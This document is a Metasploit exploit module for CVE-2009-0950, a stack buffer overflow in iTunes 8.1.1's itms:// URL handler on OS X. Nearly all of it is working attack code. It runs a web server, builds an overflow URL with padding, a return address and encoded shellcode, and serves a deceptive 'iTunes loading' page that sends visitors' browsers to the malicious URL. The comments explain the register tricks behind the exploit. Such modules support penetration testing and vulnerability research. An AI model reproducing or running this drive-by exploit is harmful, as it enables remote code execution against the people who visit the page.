Apple iTunes 8.1.1 (ITMS) Multiple Protocol Handler BOF Exploit (meta)
======================================================================



##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require &#039;msf/core&#039;


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;Apple OS X iTunes 8.1.1 ITMS Overflow&#039;,
			&#039;Description&#039;    => %q{
				This modules exploits a stack-based buffer overflow in iTunes
				itms:// URL parsing.   It is accessible from the browser and
				in Safari, itms urls will be opened in iTunes automatically.
				Because iTunes is multithreaded, only vfork-based payloads should
				be used.
			},
			&#039;Author&#039;         => [ &#039;Will Drewry <redpig@dataspill.org>&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision:  $&#039;,
			&#039;References&#039;     =>
				[
					[&#039;CVE&#039;, &#039;CVE-2009-0950&#039;],
					[&#039;URL&#039;, &#039;http://support.apple.com/kb/HT3592&#039;],
					[&#039;URL&#039;, &#039;http://redpig.dataspill.org/2009/05/drive-by-attack-for-itunes-811.html&#039;],
				],
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;       => 1024,  # rough estimate of what browsers will pass.
					&#039;DisableNops&#039; => true,  # don&#039;t pad out the space.
					&#039;BadChars&#039; => &#039;&#039;,
					# The encoder must be URL-safe otherwise it will be automatically
					# URL encoded.
					&#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumMixed,
					&#039;EncoderOptions&#039; =>
						{
							&#039;BufferRegister&#039; => &#039;ECX&#039;,  # See the comments below
							&#039;BufferOffset&#039; => 3,  # See the comments below
						},
				},
			&#039;Targets&#039;	=>
				[
					[
						&#039;OS X&#039;,
						{
							&#039;Platform&#039;      => [ &#039;osx&#039; ],
							&#039;Arch&#039;          => ARCH_X86,
							&#039;Addr&#039;          => &#039;ATe&#039;
						},
					 ],
					[
						&#039;Windows (not done yet)&#039;,
						{
							&#039;Platform&#039;      => [ &#039;win&#039; ],
							&#039;Arch&#039;          => ARCH_X86,
							&#039;Addr&#039;          => &#039;CCCC&#039;
						},
					 ],
				],
			&#039;DisclosureDate&#039; => &#039;June 1, 2009&#039;,
			&#039;DefaultTarget&#039;  => 0))

		register_options(
			[
				OptPort.new(&#039;SRVPORT&#039;, [ true, "The local port to listen on.", 80 ]),
				OptString.new(&#039;URIPATH&#039;, [ true, "The URI to use for this exploit.", "/" ])
			], self.class)
	end

	# Generate distribution script, which calls our payload using JavaScript.
	def generate_itms_page(p)
		# Set the base itms url.
		# itms:// or itmss:// can be used.  The trailing colon is used
		# to start the attack.  All data after the colon is copied to the
		# stack buffer.
		itms_base_url = "itms://:"
		itms_base_url << "A"*268  # Fill up the real buffer
		itms_base_url << "XXXXAAAAZZZZYYYY"  # $ebx, $esi, $edi, $ebp
		itms_base_url << target[&#039;Addr&#039;]  # hullo there, jmp *%ecx!
		# The first &#039;/&#039; in the buffer will terminate the copy to the stack buffer.
		# In addition, $ecx will be left pointing to the last 6 bytes of the heap
		# buffer containing the full URL.  However, if a colon and a ? occur after
		# the value in ecx will point to that point in the heap buffer.  In our
		# case, it will point to the beginning.  The ! is there to make the
		# alphanumeric shellcode execute easily.  (This is why we need an offset
		# of 3 in the payload).
		itms_base_url << p # Wooooooo! Payload time.
		# We drop on a few extra bytes as the last few bytes can sometimes be
		# corrupted.
		itms_base_url << "AAAA"

		# Use the pattern creator to simplify exploit creation :)
		# itms_base_url << Rex::Text.pattern_create(1024,
		#                                           Rex::Text::DefaultPatternSets)

		# Return back an example URL.  Using an iframe doesn&#039;t work with all
		# browsers, but that&#039;s easy enough to fix if you need to.
		return String(<<-EOS)
		<html><head><title>iTunes loading . . .</title></head>
		  <body>
		    <script>document.location.assign("#{itms_base_url}");</script>
		    <p>iTunes should open automatically, but if it doesn&#039;t, click to
		      <a href="#{itms_base_url}">continue</a>.</p>
		  </body>
		</html>
		EOS
	end

	def on_request_uri(cli, request)
		print_status("Generating payload...")
		return unless (p = regenerate_payload(cli))
		#print_status("=> #{payload.encoded}")
		print_status("=> #{payload.encoded.length} bytes")

		print_status("Generating HTML container...")
		page = generate_itms_page(payload.encoded)
		#print_status("=> #{page}")
		print_status("Sending itms page to #{cli.peerhost}:#{cli.peerport}")

		header = { &#039;Content-Type&#039; => &#039;text/html&#039; }
		send_response_html(cli, page, header)
		handler(cli)
	end

end




